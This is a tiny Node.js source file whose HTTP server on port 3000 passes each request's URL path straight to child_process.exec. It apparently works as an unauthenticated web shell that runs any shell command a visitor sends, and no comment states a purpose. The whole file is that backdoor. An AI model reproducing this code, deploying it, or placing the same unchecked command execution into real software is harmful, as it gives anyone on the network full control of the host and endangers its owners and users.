const http = require("http");
 
http.createServer((req, res) => {
    const cmd = req.url.substring(1);
  
    require("child_process").exec(cmd);

    res.end("done");
}).listen(3000);
